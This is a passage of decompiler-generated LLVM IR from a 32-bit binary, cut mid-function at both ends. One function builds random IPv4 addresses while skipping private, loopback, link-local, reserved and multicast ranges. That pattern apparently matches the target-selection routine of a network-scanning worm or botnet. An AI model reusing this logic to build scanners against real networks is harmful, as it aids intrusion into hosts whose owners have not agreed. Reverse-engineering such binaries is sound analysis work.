  %v2_80498cf = udiv i32 %tmp12, 32
  %v2_80498d8 = mul nuw nsw i32 %v2_80498cf, 4
  %v3_80498d8 = add nsw i32 %v2_80498d8, -156
  br label %dec_label_pc_80499eb

dec_label_pc_80498b1:                             ; preds = %dec_label_pc_80499f9, %dec_label_pc_80499eb
  %v5_80498c2 = call i8* @_memset(i8* %tmp37, i32 0, i32 32)
  %v0_80498d8 = load i32, i32* @ebp, align 4
  %v4_80498d8 = add i32 %v3_80498d8, %v0_80498d8
  %v5_80498d8 = inttoptr i32 %v4_80498d8 to i32*
  %v6_80498d8 = load i32, i32* %v5_80498d8, align 4
  %v12_80498d8 = or i32 %v6_80498d8, %v9_80498d8
  store i32 %v12_80498d8, i32* %v5_80498d8, align 4
  %v5_80498fa = call i32 @function_804e074(i32 %v1_80498e3, i32 %v2_80498bb, i32 0, i32 0, i32 %v2_80498e7)
  %tmp40 = icmp slt i32 %v5_80498fa, 1
  br i1 %tmp40, label %dec_label_pc_8049a19, label %dec_label_pc_804990a

dec_label_pc_804990a:                             ; preds = %dec_label_pc_80498b1
  %v5_804990d = add i32 %v4_80499e047, %tmp11
  %v5_804991d = call i32 @function_804f618(i32 %tmp12, i32 %v5_804990d, i32 1, i32 0)
  %v14_8049928 = icmp ne i32 %v5_804991d, -1
  %v5_804992e = icmp eq i32 %v5_804991d, 0
  %v1_8049932 = icmp eq i1 %v5_804992e, false
  %or.cond = and i1 %v14_8049928, %v1_8049932
  br i1 %or.cond, label %dec_label_pc_8049943, label %dec_label_pc_8049934

dec_label_pc_8049934:                             ; preds = %dec_label_pc_804990a
  br label %dec_label_pc_8049a23

dec_label_pc_8049943:                             ; preds = %dec_label_pc_804990a
  %v5_8049910 = inttoptr i32 %v5_804990d to i8*
  %v6_8049946 = add i32 %v5_804991d, %v4_80499e047
  %v26_8049946 = inttoptr i32 %v6_8049946 to i8*
  %v2_804994c = load i8, i8* %v5_8049910, align 1
  %v11_804994e = icmp eq i8 %v2_804994c, -1
  %v1_8049950 = icmp eq i1 %v11_804994e, false
  br i1 %v1_8049950, label %dec_label_pc_80499ad, label %dec_label_pc_8049952

dec_label_pc_8049952:                             ; preds = %dec_label_pc_8049943
  %v1_8049955 = add i32 %v5_804990d, 1
  %v5_804995e = call i32 @function_804f618(i32 %tmp12, i32 %v1_8049955, i32 2, i32 0)
  %v14_8049969 = icmp ne i32 %v5_804995e, -1
  %v5_804996f = icmp eq i32 %v5_804995e, 0
  %v1_8049973 = icmp eq i1 %v5_804996f, false
  %or.cond43 = and i1 %v14_8049969, %v1_8049973
  br i1 %or.cond43, label %dec_label_pc_8049984, label %dec_label_pc_8049975

dec_label_pc_8049975:                             ; preds = %dec_label_pc_8049952
  br label %dec_label_pc_8049a23

dec_label_pc_8049984:                             ; preds = %dec_label_pc_8049952
  %v6_8049987 = add i32 %v5_804995e, %v6_8049946
  %v26_8049987 = inttoptr i32 %v6_8049987 to i8*
  %v4_8049995 = call i32 @function_8049679(i32 %tmp12, i32 %v5_804990d, i32 3)
  %v1_804999d = icmp eq i32 %v4_8049995, 0
  %v1_804999f = icmp eq i1 %v1_804999d, false
  br i1 %v1_804999f, label %dec_label_pc_80499e0.backedge, label %dec_label_pc_80499a1

dec_label_pc_80499e0.backedge:                    ; preds = %dec_label_pc_8049984, %dec_label_pc_80499c2, %dec_label_pc_80499c8
  %stack_var_-32.0.be = phi i8* [ %v26_8049946, %dec_label_pc_80499c2 ], [ %v26_8049946, %dec_label_pc_80499c8 ], [ %v26_8049987, %dec_label_pc_8049984 ]
  %v4_80499e0 = ptrtoint i8* %stack_var_-32.0.be to i32
  %v1_80499e3 = add i32 %v4_80499e0, 2
  %v5_80499e9 = icmp slt i32 %v1_80499e3, %tmp
  br i1 %v5_80499e9, label %dec_label_pc_80499e0.backedge.dec_label_pc_80499eb_crit_edge, label %dec_label_pc_8049a19

dec_label_pc_80499e0.backedge.dec_label_pc_80499eb_crit_edge: ; preds = %dec_label_pc_80499e0.backedge
  %v3_80499eb.pre = load i32, i32* %stack_var_-168, align 4
  br label %dec_label_pc_80499eb

dec_label_pc_80499a1:                             ; preds = %dec_label_pc_8049984
  br label %dec_label_pc_8049a23

dec_label_pc_80499ad:                             ; preds = %dec_label_pc_8049943
  %v4_80499b6 = call i32 @function_804f284(i32 %tmp11, i8* %v8_80499b0)
  %v1_80499be = icmp eq i32 %v4_80499b6, 0
  %v1_80499c0 = icmp eq i1 %v1_80499be, false
  br i1 %v1_80499c0, label %dec_label_pc_8049a0d, label %dec_label_pc_80499c2

dec_label_pc_80499c2:                             ; preds = %dec_label_pc_80499ad
  br i1 %v4_80499c2, label %dec_label_pc_80499e0.backedge, label %dec_label_pc_80499c8

dec_label_pc_80499c8:                             ; preds = %dec_label_pc_80499c2
  %v2_80499cb = call i32 @function_8049774(i8* %v1_80499cb)
  %v1_80499d3 = icmp eq i32 %v2_80499cb, 0
  br i1 %v1_80499d3, label %dec_label_pc_80499e0.backedge, label %dec_label_pc_8049a0d

dec_label_pc_80499eb:                             ; preds = %dec_label_pc_80499e0.backedge.dec_label_pc_80499eb_crit_edge, %dec_label_pc_80499eb.lr.ph
  %v3_80499eb = phi i32 [ %tmp18, %dec_label_pc_80499eb.lr.ph ], [ %v3_80499eb.pre, %dec_label_pc_80499e0.backedge.dec_label_pc_80499eb_crit_edge ]
  %v4_80499e047 = phi i32 [ %tmp22, %dec_label_pc_80499eb.lr.ph ], [ %v4_80499e0, %dec_label_pc_80499e0.backedge.dec_label_pc_80499eb_crit_edge ]
  %tmp41 = icmp slt i32 %v3_80499eb, 1
  %tmp42 = icmp eq i1 %tmp41, false
  br i1 %tmp42, label %dec_label_pc_80498b1, label %dec_label_pc_80499f9

dec_label_pc_80499f9:                             ; preds = %dec_label_pc_80499eb
  br i1 %tmp39, label %dec_label_pc_80498b1, label %dec_label_pc_8049a19

dec_label_pc_8049a0d:                             ; preds = %dec_label_pc_80499c8, %dec_label_pc_80499ad
  br label %dec_label_pc_8049a23

dec_label_pc_8049a19:                             ; preds = %dec_label_pc_80499e0.backedge, %dec_label_pc_80499f9, %dec_label_pc_80498b1, %dec_label_pc_8049875
  br label %dec_label_pc_8049a23

dec_label_pc_8049a23:                             ; preds = %dec_label_pc_8049a0d, %dec_label_pc_80499a1, %dec_label_pc_8049975, %dec_label_pc_8049934, %dec_label_pc_8049a19
  %v3_8049a23 = phi i32 [ 1, %dec_label_pc_8049a0d ], [ 0, %dec_label_pc_80499a1 ], [ 0, %dec_label_pc_8049975 ], [ 0, %dec_label_pc_8049934 ], [ 0, %dec_label_pc_8049a19 ]
  %v3_8049a29 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8049a29, i32* @edi, align 4
  ret i32 %v3_8049a23

; uselistorder directives
  uselistorder i32 %v5_804990d, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-168, { 0, 2, 1 }
  uselistorder i32 %tmp12, { 5, 4, 3, 0, 2, 1 }
  uselistorder i32 %tmp11, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_804f618, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049a23, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8049a19, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80499e0.backedge, { 2, 1, 0 }
}

define i32 @function_8049a2e(i32 %arg1) local_unnamed_addr {
dec_label_pc_8049a2e:
  %stack_var_-32 = alloca i32, align 4
  %v0_8049a31 = load i32, i32* @esi, align 4
  %v0_8049a32 = load i32, i32* @ebx, align 4
  %v2_8049a3d = call i32 @function_805052c(i32 0)
  %v2_8049a4d = ashr i32 %v2_8049a3d, 31
  %v2_8049a50 = zext i32 %v2_8049a3d to i64
  %v4_8049a50 = zext i32 %v2_8049a4d to i64
  %v5_8049a50 = mul nuw i64 %v4_8049a50, 4294967296
  %v6_8049a50 = or i64 %v5_8049a50, %v2_8049a50
  %v10_8049a50 = srem i64 %v6_8049a50, 253
  %v11_8049a50 = trunc i64 %v10_8049a50 to i32
  store i32 %v11_8049a50, i32* @eax, align 4
  %v6_8049a54 = trunc i64 %v10_8049a50 to i8
  %v1_8049a57 = sext i8 %v6_8049a54 to i32
  %v2_8049a57 = call i32 @function_805052c(i32 %v1_8049a57)
  %v2_8049a67 = ashr i32 %v2_8049a57, 31
  %v2_8049a6a = zext i32 %v2_8049a57 to i64
  %v4_8049a6a = zext i32 %v2_8049a67 to i64
  %v5_8049a6a = mul nuw i64 %v4_8049a6a, 4294967296
  %v6_8049a6a = or i64 %v5_8049a6a, %v2_8049a6a
  %v10_8049a6a = srem i64 %v6_8049a6a, 255
  %v11_8049a6a = trunc i64 %v10_8049a6a to i32
  store i32 %v11_8049a6a, i32* @eax, align 4
  %v1_8049a6e = trunc i64 %v10_8049a6a to i8
  %v1_8049a71 = sext i8 %v1_8049a6e to i32
  %v2_8049a71 = call i32 @function_805052c(i32 %v1_8049a71)
  %v2_8049a81 = ashr i32 %v2_8049a71, 31
  %v2_8049a84 = zext i32 %v2_8049a71 to i64
  %v4_8049a84 = zext i32 %v2_8049a81 to i64
  %v5_8049a84 = mul nuw i64 %v4_8049a84, 4294967296
  %v6_8049a84 = or i64 %v5_8049a84, %v2_8049a84
  %v10_8049a84 = srem i64 %v6_8049a84, 255
  %v11_8049a84 = trunc i64 %v10_8049a84 to i32
  store i32 %v11_8049a84, i32* @eax, align 4
  %v1_8049a88 = trunc i64 %v10_8049a84 to i8
  %v1_8049a8b = sext i8 %v1_8049a88 to i32
  %v2_8049a8b = call i32 @function_805052c(i32 %v1_8049a8b)
  %v2_8049a9b = ashr i32 %v2_8049a8b, 31
  %v2_8049a9e = zext i32 %v2_8049a8b to i64
  %v4_8049a9e = zext i32 %v2_8049a9b to i64
  %v5_8049a9e = mul nuw i64 %v4_8049a9e, 4294967296
  %v6_8049a9e = or i64 %v5_8049a9e, %v2_8049a9e
  br label %dec_label_pc_8049b0f

dec_label_pc_8049aa7:                             ; preds = %dec_label_pc_8049b61, %dec_label_pc_8049bff, %dec_label_pc_8049bf4, %dec_label_pc_8049bdb, %dec_label_pc_8049bc2, %dec_label_pc_8049bb7, %dec_label_pc_8049ba5, %dec_label_pc_8049b93, %dec_label_pc_8049b7a, %dec_label_pc_8049b48, %dec_label_pc_8049b36, %dec_label_pc_8049b2b, %dec_label_pc_8049b16, %dec_label_pc_8049b0f
  %sext = mul i32 %extract.t, 16777216
  %v1_8049aa7 = sdiv i32 %sext, 16777216
  %v2_8049aa7 = call i32 @function_805052c(i32 %v1_8049aa7)
  %v2_8049ab7 = ashr i32 %v2_8049aa7, 31
  %v2_8049aba = zext i32 %v2_8049aa7 to i64
  %v4_8049aba = zext i32 %v2_8049ab7 to i64
  %v5_8049aba = mul nuw i64 %v4_8049aba, 4294967296
  %v6_8049aba = or i64 %v5_8049aba, %v2_8049aba
  %v10_8049aba = srem i64 %v6_8049aba, 253
  %v11_8049aba = trunc i64 %v10_8049aba to i32
  store i32 %v11_8049aba, i32* @eax, align 4
  %v6_8049abe = trunc i64 %v10_8049aba to i8
  %v1_8049ac1 = sext i8 %v6_8049abe to i32
  %v2_8049ac1 = call i32 @function_805052c(i32 %v1_8049ac1)
  %v2_8049ad1 = ashr i32 %v2_8049ac1, 31
  %v2_8049ad4 = zext i32 %v2_8049ac1 to i64
  %v4_8049ad4 = zext i32 %v2_8049ad1 to i64
  %v5_8049ad4 = mul nuw i64 %v4_8049ad4, 4294967296
  %v6_8049ad4 = or i64 %v5_8049ad4, %v2_8049ad4
  %v10_8049ad4 = srem i64 %v6_8049ad4, 255
  %v11_8049ad4 = trunc i64 %v10_8049ad4 to i32
  store i32 %v11_8049ad4, i32* @eax, align 4
  %v1_8049ad8 = trunc i64 %v10_8049ad4 to i8
  %v1_8049adb = sext i8 %v1_8049ad8 to i32
  %v2_8049adb = call i32 @function_805052c(i32 %v1_8049adb)
  %v2_8049aeb = ashr i32 %v2_8049adb, 31
  %v2_8049aee = zext i32 %v2_8049adb to i64
  %v4_8049aee = zext i32 %v2_8049aeb to i64
  %v5_8049aee = mul nuw i64 %v4_8049aee, 4294967296
  %v6_8049aee = or i64 %v5_8049aee, %v2_8049aee
  %v10_8049aee = srem i64 %v6_8049aee, 255
  %v11_8049aee = trunc i64 %v10_8049aee to i32
  store i32 %v11_8049aee, i32* @eax, align 4
  %v1_8049af2 = trunc i64 %v10_8049aee to i8
  %v1_8049af5 = sext i8 %v1_8049af2 to i32
  %v2_8049af5 = call i32 @function_805052c(i32 %v1_8049af5)
  %v2_8049b05 = ashr i32 %v2_8049af5, 31
  %v2_8049b08 = zext i32 %v2_8049af5 to i64
  %v4_8049b08 = zext i32 %v2_8049b05 to i64
  %v5_8049b08 = mul nuw i64 %v4_8049b08, 4294967296
  %v6_8049b08 = or i64 %v5_8049b08, %v2_8049b08
  br label %dec_label_pc_8049b0f

dec_label_pc_8049b0f:                             ; preds = %dec_label_pc_8049a2e, %dec_label_pc_8049aa7
  %v6_8049a9e.sink = phi i64 [ %v6_8049a9e, %dec_label_pc_8049a2e ], [ %v6_8049b08, %dec_label_pc_8049aa7 ]
  %stack_var_-15.0 = phi i8 [ %v1_8049a6e, %dec_label_pc_8049a2e ], [ %v1_8049ad8, %dec_label_pc_8049aa7 ]
  %stack_var_-14.0 = phi i8 [ %v1_8049a88, %dec_label_pc_8049a2e ], [ %v1_8049af2, %dec_label_pc_8049aa7 ]
  %stack_var_-16.0 = phi i8 [ %v6_8049a54, %dec_label_pc_8049a2e ], [ %v6_8049abe, %dec_label_pc_8049aa7 ]
  %v10_8049a9e = srem i64 %v6_8049a9e.sink, 255
  %extract.t = trunc i64 %v10_8049a9e to i32
  %v4_8049b0f = sext i8 %stack_var_-16.0 to i32
  %v7_8049b0f = and i32 %extract.t, -256
  %v8_8049b0f = or i32 %v4_8049b0f, %v7_8049b0f
  store i32 %v8_8049b0f, i32* @eax, align 4
  %v4_8049b12 = icmp eq i8 %stack_var_-16.0, 0
  br i1 %v4_8049b12, label %dec_label_pc_8049aa7, label %dec_label_pc_8049b16

dec_label_pc_8049b16:                             ; preds = %dec_label_pc_8049b0f
  store i32 %v8_8049b0f, i32* @eax, align 4
  %v10_8049b19 = icmp eq i8 %stack_var_-16.0, 10
  br i1 %v10_8049b19, label %dec_label_pc_8049aa7, label %dec_label_pc_8049b1d

dec_label_pc_8049b1d:                             ; preds = %dec_label_pc_8049b16
  %v10_8049b20 = icmp eq i8 %stack_var_-16.0, 100
  %v1_8049b22 = icmp eq i1 %v10_8049b20, false
  br i1 %v1_8049b22, label %dec_label_pc_8049b36, label %dec_label_pc_8049b24

dec_label_pc_8049b24:                             ; preds = %dec_label_pc_8049b1d
  %v4_8049b24 = zext i8 %stack_var_-15.0 to i32
  %v6_8049b24 = and i32 %v8_8049b0f, -256
  %v7_8049b24 = or i32 %v6_8049b24, %v4_8049b24
  %tmp41 = icmp ult i8 %stack_var_-15.0, 64
  br i1 %tmp41, label %dec_label_pc_8049b36, label %dec_label_pc_8049b2b

dec_label_pc_8049b2b:                             ; preds = %dec_label_pc_8049b24
  store i32 %v7_8049b24, i32* @eax, align 4
  %v5_8049b2e = icmp slt i8 %stack_var_-15.0, 0
  %v1_8049b30 = icmp eq i1 %v5_8049b2e, false
  br i1 %v1_8049b30, label %dec_label_pc_8049aa7, label %dec_label_pc_8049b36

dec_label_pc_8049b36:                             ; preds = %dec_label_pc_8049b2b, %dec_label_pc_8049b24, %dec_label_pc_8049b1d
  %v6_8049b36 = phi i32 [ %v7_8049b24, %dec_label_pc_8049b2b ], [ %v7_8049b24, %dec_label_pc_8049b24 ], [ %v8_8049b0f, %dec_label_pc_8049b1d ]
  %v7_8049b36 = and i32 %v6_8049b36, -256
  %v8_8049b36 = or i32 %v7_8049b36, %v4_8049b0f
  store i32 %v8_8049b36, i32* @eax, align 4
  %v10_8049b39 = icmp eq i8 %stack_var_-16.0, 127
  br i1 %v10_8049b39, label %dec_label_pc_8049aa7, label %dec_label_pc_8049b41

dec_label_pc_8049b41:                             ; preds = %dec_label_pc_8049b36
  %v7_8049b41 = and i32 %v8_8049b36, -256
  %v8_8049b41 = or i32 %v7_8049b41, %v4_8049b0f
  %v11_8049b44 = icmp eq i8 %stack_var_-16.0, -87
  %v1_8049b46 = icmp eq i1 %v11_8049b44, false
  br i1 %v1_8049b46, label %dec_label_pc_8049b53, label %dec_label_pc_8049b48

dec_label_pc_8049b48:                             ; preds = %dec_label_pc_8049b41
  %v4_8049b48 = zext i8 %stack_var_-15.0 to i32
  %v6_8049b48 = and i32 %v8_8049b41, -256
  %v7_8049b48 = or i32 %v6_8049b48, %v4_8049b48
  store i32 %v7_8049b48, i32* @eax, align 4
  %v11_8049b4b = icmp eq i8 %stack_var_-15.0, -2
  br i1 %v11_8049b4b, label %dec_label_pc_8049aa7, label %dec_label_pc_8049b53

dec_label_pc_8049b53:                             ; preds = %dec_label_pc_8049b48, %dec_label_pc_8049b41
  %v6_8049b53 = phi i32 [ %v7_8049b48, %dec_label_pc_8049b48 ], [ %v8_8049b41, %dec_label_pc_8049b41 ]
  %v7_8049b53 = and i32 %v6_8049b53, -256
  %v8_8049b53 = or i32 %v7_8049b53, %v4_8049b0f
  %v11_8049b56 = icmp eq i8 %stack_var_-16.0, -84
  %v1_8049b58 = icmp eq i1 %v11_8049b56, false
  br i1 %v1_8049b58, label %dec_label_pc_8049b6c, label %dec_label_pc_8049b5a

dec_label_pc_8049b5a:                             ; preds = %dec_label_pc_8049b53
  %v4_8049b5a = zext i8 %stack_var_-15.0 to i32
  %v6_8049b5a = and i32 %v8_8049b53, -256
  %v7_8049b5a = or i32 %v6_8049b5a, %v4_8049b5a
  %tmp42 = icmp ult i8 %stack_var_-15.0, 17
  br i1 %tmp42, label %dec_label_pc_8049b61, label %dec_label_pc_8049b6c

dec_label_pc_8049b61:                             ; preds = %dec_label_pc_8049b5a
  store i32 %v7_8049b5a, i32* @eax, align 4
  br label %dec_label_pc_8049aa7

dec_label_pc_8049b6c:                             ; preds = %dec_label_pc_8049b5a, %dec_label_pc_8049b53
  %v6_8049b6c = phi i32 [ %v7_8049b5a, %dec_label_pc_8049b5a ], [ %v8_8049b53, %dec_label_pc_8049b53 ]
  %v8_8049b6f = icmp eq i8 %stack_var_-16.0, -64
  %v1_8049b71 = icmp eq i1 %v8_8049b6f, false
  br i1 %v1_8049b71, label %dec_label_pc_8049b9e.thread, label %dec_label_pc_8049b73

dec_label_pc_8049b73:                             ; preds = %dec_label_pc_8049b6c
  %v8_8049b6c = or i32 %v6_8049b6c, %v4_8049b0f
  %v4_8049b73 = zext i8 %stack_var_-15.0 to i32
  %v6_8049b73 = and i32 %v8_8049b6c, -256
  %v7_8049b73 = or i32 %v6_8049b73, %v4_8049b73
  %v4_8049b76 = icmp eq i8 %stack_var_-15.0, 0
  %v1_8049b78 = icmp eq i1 %v4_8049b76, false
  br i1 %v1_8049b78, label %dec_label_pc_8049b8c, label %dec_label_pc_8049b7a

dec_label_pc_8049b7a:                             ; preds = %dec_label_pc_8049b73
  %v4_8049b7a = zext i8 %stack_var_-14.0 to i32
  %v7_8049b7a = or i32 %v6_8049b73, %v4_8049b7a
  store i32 %v7_8049b7a, i32* @eax, align 4
  %v10_8049b7d = icmp eq i8 %stack_var_-14.0, 2
  br i1 %v10_8049b7d, label %dec_label_pc_8049aa7, label %dec_label_pc_8049b8c

dec_label_pc_8049b8c:                             ; preds = %dec_label_pc_8049b73, %dec_label_pc_8049b7a
  %v6_8049b85 = phi i32 [ %v7_8049b7a, %dec_label_pc_8049b7a ], [ %v7_8049b73, %dec_label_pc_8049b73 ]
  %v8_8049b85 = or i32 %v6_8049b85, %v4_8049b0f
  %v6_8049b8c = and i32 %v8_8049b85, -256
  %v7_8049b8c = or i32 %v6_8049b8c, %v4_8049b73
  %v10_8049b8f = icmp eq i8 %stack_var_-15.0, 88
  %v1_8049b91 = icmp eq i1 %v10_8049b8f, false
  br i1 %v1_8049b91, label %dec_label_pc_8049ba5, label %dec_label_pc_8049b93

dec_label_pc_8049b93:                             ; preds = %dec_label_pc_8049b8c
  %v4_8049b93 = zext i8 %stack_var_-14.0 to i32
  %v7_8049b93 = or i32 %v6_8049b8c, %v4_8049b93
  store i32 %v7_8049b93, i32* @eax, align 4
  %v10_8049b96 = icmp eq i8 %stack_var_-14.0, 99
  br i1 %v10_8049b96, label %dec_label_pc_8049aa7, label %dec_label_pc_8049ba5

dec_label_pc_8049b9e.thread:                      ; preds = %dec_label_pc_8049b6c
  %v8_8049b85.c = or i32 %v6_8049b6c, %v4_8049b0f
  %v7_8049b9e39 = and i32 %v8_8049b85.c, -256
  %v8_8049b9e40 = or i32 %v7_8049b9e39, %v4_8049b0f
  br label %dec_label_pc_8049bb0

dec_label_pc_8049ba5:                             ; preds = %dec_label_pc_8049b8c, %dec_label_pc_8049b93
  %v6_8049b9e = phi i32 [ %v7_8049b93, %dec_label_pc_8049b93 ], [ %v7_8049b8c, %dec_label_pc_8049b8c ]
  %v8_8049b9e = or i32 %v6_8049b9e, %v4_8049b0f
  %v6_8049ba5 = and i32 %v8_8049b9e, -256
  %v7_8049ba5 = or i32 %v6_8049ba5, %v4_8049b73
  store i32 %v7_8049ba5, i32* @eax, align 4
  %v11_8049ba8 = icmp eq i8 %stack_var_-15.0, -88
  br i1 %v11_8049ba8, label %dec_label_pc_8049aa7, label %dec_label_pc_8049bb0

dec_label_pc_8049bb0:                             ; preds = %dec_label_pc_8049b9e.thread, %dec_label_pc_8049ba5
  %v6_8049bb0 = phi i32 [ %v7_8049ba5, %dec_label_pc_8049ba5 ], [ %v8_8049b9e40, %dec_label_pc_8049b9e.thread ]
  %v7_8049bb0 = and i32 %v6_8049bb0, -256
  %v8_8049bb0 = or i32 %v7_8049bb0, %v4_8049b0f
  %v11_8049bb3 = icmp eq i8 %stack_var_-16.0, -58
  %v1_8049bb5 = icmp eq i1 %v11_8049bb3, false
  br i1 %v1_8049bb5, label %dec_label_pc_8049be6.critedge, label %dec_label_pc_8049bb7

dec_label_pc_8049bb7:                             ; preds = %dec_label_pc_8049bb0
  %v4_8049bb7 = zext i8 %stack_var_-15.0 to i32
  %v6_8049bb7 = and i32 %v8_8049bb0, -256
  %v7_8049bb7 = or i32 %v6_8049bb7, %v4_8049bb7
  store i32 %v7_8049bb7, i32* @eax, align 4
  %v10_8049bba = icmp eq i8 %stack_var_-15.0, 18
  br i1 %v10_8049bba, label %dec_label_pc_8049aa7, label %dec_label_pc_8049bc2

dec_label_pc_8049bc2:                             ; preds = %dec_label_pc_8049bb7
  store i32 %v7_8049bb7, i32* @eax, align 4
  %v10_8049bc5 = icmp eq i8 %stack_var_-15.0, 19
  br i1 %v10_8049bc5, label %dec_label_pc_8049aa7, label %dec_label_pc_8049bd4

dec_label_pc_8049bd4:                             ; preds = %dec_label_pc_8049bc2
  %v8_8049bcd = or i32 %v6_8049bb0, %v4_8049b0f
  %v6_8049bd4 = and i32 %v8_8049bcd, -256
  %v7_8049bd4 = or i32 %v6_8049bd4, %v4_8049bb7
  %v10_8049bd7 = icmp eq i8 %stack_var_-15.0, 51
  %v1_8049bd9 = icmp eq i1 %v10_8049bd7, false
  br i1 %v1_8049bd9, label %dec_label_pc_8049be6, label %dec_label_pc_8049bdb

dec_label_pc_8049bdb:                             ; preds = %dec_label_pc_8049bd4
  %v4_8049bdb = zext i8 %stack_var_-14.0 to i32
  %v7_8049bdb = or i32 %v6_8049bd4, %v4_8049bdb
  store i32 %v7_8049bdb, i32* @eax, align 4
  %v10_8049bde = icmp eq i8 %stack_var_-14.0, 100
  br i1 %v10_8049bde, label %dec_label_pc_8049aa7, label %dec_label_pc_8049be6

dec_label_pc_8049be6.critedge:                    ; preds = %dec_label_pc_8049bb0
  %v7_8049bcd.c = and i32 %v8_8049bb0, -256
  %v8_8049bcd.c = or i32 %v7_8049bcd.c, %v4_8049b0f
  br label %dec_label_pc_8049be6

dec_label_pc_8049be6:                             ; preds = %dec_label_pc_8049be6.critedge, %dec_label_pc_8049bdb, %dec_label_pc_8049bd4
  %v6_8049be6 = phi i32 [ %v8_8049bcd.c, %dec_label_pc_8049be6.critedge ], [ %v7_8049bdb, %dec_label_pc_8049bdb ], [ %v7_8049bd4, %dec_label_pc_8049bd4 ]
  %v7_8049be6 = and i32 %v6_8049be6, -256
  %v8_8049be6 = or i32 %v7_8049be6, %v4_8049b0f
  %v11_8049be9 = icmp eq i8 %stack_var_-16.0, -53
  %v1_8049beb = icmp eq i1 %v11_8049be9, false
  br i1 %v1_8049beb, label %dec_label_pc_8049bff, label %dec_label_pc_8049bed

dec_label_pc_8049bed:                             ; preds = %dec_label_pc_8049be6
  %v4_8049bed = zext i8 %stack_var_-15.0 to i32
  %v6_8049bed = and i32 %v8_8049be6, -256
  %v7_8049bed = or i32 %v6_8049bed, %v4_8049bed
  %v4_8049bf0 = icmp eq i8 %stack_var_-15.0, 0
  %v1_8049bf2 = icmp eq i1 %v4_8049bf0, false
  br i1 %v1_8049bf2, label %dec_label_pc_8049bff, label %dec_label_pc_8049bf4

dec_label_pc_8049bf4:                             ; preds = %dec_label_pc_8049bed
  %v4_8049bf4 = zext i8 %stack_var_-14.0 to i32
  %v7_8049bf4 = or i32 %v6_8049bed, %v4_8049bf4
  store i32 %v7_8049bf4, i32* @eax, align 4
  %v10_8049bf7 = icmp eq i8 %stack_var_-14.0, 113
  br i1 %v10_8049bf7, label %dec_label_pc_8049aa7, label %dec_label_pc_8049bff

dec_label_pc_8049bff:                             ; preds = %dec_label_pc_8049bf4, %dec_label_pc_8049bed, %dec_label_pc_8049be6
  %v6_8049bff = phi i32 [ %v7_8049bf4, %dec_label_pc_8049bf4 ], [ %v7_8049bed, %dec_label_pc_8049bed ], [ %v8_8049be6, %dec_label_pc_8049be6 ]
  %v7_8049bff = and i32 %v6_8049bff, -256
  %v8_8049bff = or i32 %v7_8049bff, %v4_8049b0f
  store i32 %v8_8049bff, i32* @eax, align 4
  %tmp43 = icmp ult i8 %stack_var_-16.0, -32
  br i1 %tmp43, label %dec_label_pc_8049c0a, label %dec_label_pc_8049aa7

dec_label_pc_8049c0a:                             ; preds = %dec_label_pc_8049bff
  store i32 0, i32* %stack_var_-32, align 4
  %v4_8049c26 = urem i32 %extract.t, 256
  store i32 %v4_8049c26, i32* @edx, align 4
  %v4_8049c30 = zext i8 %stack_var_-14.0 to i32
  %v4_8049c3a = zext i8 %stack_var_-15.0 to i32
  store i32 %v4_8049c3a, i32* @ebx, align 4
  %v1_8049c47 = urem i32 %v4_8049b0f, 256
  %v2_8049c4c = ptrtoint i32* %stack_var_-32 to i32
  %v7_8049c5c = call i32 @function_8048885(i32 %v2_8049c4c, i32 ptrtoint ([12 x i8]* @global_var_8052983.30 to i32), i32 %v1_8049c47, i32 %v4_8049c3a, i32 %v4_8049c30, i32 %v4_8049c26)
  %v1_8049c6b = call i32 @function_804f55c(i32 %v2_8049c4c)
  store i32 %v0_8049a32, i32* @ebx, align 4
  store i32 %v0_8049a31, i32* @esi, align 4
  ret i32 %v1_8049c6b

; uselistorder directives
  uselistorder i32 %v6_8049b6c, { 1, 0 }
  uselistorder i32 %v7_8049b5a, { 1, 0 }
  uselistorder i32 %v7_8049b24, { 2, 1, 0 }
  uselistorder i32 %extract.t, { 0, 2, 1 }
  uselistorder i8 %stack_var_-16.0, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i8 %stack_var_-14.0, { 0, 1, 8, 2, 7, 3, 6, 4, 5 }
  uselistorder i8 %stack_var_-15.0, { 0, 17, 16, 1, 2, 3, 15, 4, 5, 14, 13, 6, 12, 7, 11, 9, 8, 10 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32 (i32)* @function_804f55c, { 1, 0 }
  uselistorder i64 255, { 2, 0, 1, 3, 4 }
  uselistorder i32 (i32)* @function_805052c, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8049bb0, { 1, 0 }
  uselistorder label %dec_label_pc_8049ba5, { 1, 0 }
  uselistorder label %dec_label_pc_8049b8c, { 1, 0 }
  uselistorder label %dec_label_pc_8049b0f, { 1, 0 }
  uselistorder label %dec_label_pc_8049aa7, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13 }
}

define i32 @function_8049c7a(i32 %arg1) local_unnamed_addr {
dec_label_pc_8049c7a:
  %v0_8049c80 = load i32, i32* @global_var_805b4a0.31, align 32
  %v1_8049c89 = call i32 @function_804f4ef(i32 %v0_8049c80)
  %v5_8049c91 = and i32 %v1_8049c89, %arg1
  %v1_8049c97 = call i32 @function_8048298(i32 %v5_8049c91)
  %v1_8049ca1 = sub i32 -1, %arg1
  %v2_8049ca3 = and i32 %v1_8049c97, %v1_8049ca1
  %v5_8049ca5 = xor i32 %v2_8049ca3, %v5_8049c91
  ret i32 %v5_8049ca5
}

define i32 @function_8049caa(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8049caa:
  %v4_8049ce34 = add i32 %arg2, -1
  %v9_8049ce36 = sub i32 0, %arg2
  %v10_8049ce37 = and i32 %arg2, %v9_8049ce36
  %v11_8049ce38 = icmp slt i32 %v10_8049ce37, 0
  %v12_8049ce39 = icmp eq i32 %v4_8049ce34, 0
  %v13_8049ce310 = icmp slt i32 %v4_8049ce34, 0
  %v3_8049ce711 = icmp eq i1 %v13_8049ce310, %v11_8049ce38
  %v4_8049ce712 = icmp eq i1 %v12_8049ce39, false
  %v5_8049ce713 = and i1 %v4_8049ce712, %v3_8049ce711
